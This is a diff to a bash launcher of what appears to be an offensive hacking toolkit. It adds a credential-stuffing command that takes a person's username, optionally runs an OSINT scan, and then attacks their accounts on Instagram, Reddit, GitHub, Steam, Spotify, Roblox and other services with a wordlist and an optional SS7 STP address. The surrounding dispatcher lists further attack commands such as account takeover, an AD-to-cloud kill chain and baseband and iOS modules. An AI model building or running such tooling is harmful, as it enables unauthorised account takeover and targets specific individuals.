@@ -9675,6 +9675,34 @@ cmd_takeover() {
 }
 
 # ══════════════════════════════════════════════════════════════════════════════
+# CRED STUFFER — multi-platform credential stuffing
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_stuff() {
+    local USERNAME="${1:-}"
+    local PLATFORM="${2:-}"
+    local WORDLIST="${3:-}"
+    local SS7="${4:-}"
+    local MOD="$OP/modules/cred_stuffer.py"
+    if [ -z "$USERNAME" ]; then
+        err "Usage: bash start stuff <username> [platform|all] [wordlist] [ss7-stp-ip]"
+        err "Platforms: instagram reddit github chess.com lichess duolingo hackerrank"
+        err "           twitch spotify snapchat wordpress steam wattpad roblox"
+        err "  all      — OSINT scan then attack all found platforms"
+        err "  --all-found — same as 'all'"
+        return 1
+    fi
+    local ARGS="-u $USERNAME"
+    if [ -n "$PLATFORM" ] && [ "$PLATFORM" != "all" ]; then
+        ARGS="$ARGS -P $PLATFORM"
+    else
+        ARGS="$ARGS --all-found"
+    fi
+    [ -n "$WORDLIST" ] && ARGS="$ARGS -w $WORDLIST"
+    [ -n "$SS7"      ] && ARGS="$ARGS --ss7-stp $SS7"
+    python3 "$MOD" $ARGS
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
 # AD→Cloud Kill Chain
 # ══════════════════════════════════════════════════════════════════════════════
 cmd_adchain() {
@@ -10842,6 +10870,7 @@ case "$CMD" in
     adchain)        init_files; cmd_adchain "$2" "$3" "$4" "$5" ;;
     osint)          init_files; cmd_osint "$2" "$3" "$4" "$5" ;;
     takeover)       init_files; cmd_takeover "$2" "$3" "$4" "$5" ;;
+    stuff)          init_files; cmd_stuff    "$2" "$3" "$4" "$5" ;;
     uefi)           init_files; cmd_uefi "$2" "$3" "$4" "$5" ;;
     baseband)       init_files; cmd_baseband "$2" "$3" "$4" "$5" ;;
     ios)            init_files; cmd_ios      "$2" "$3" "$4" "$5" ;;
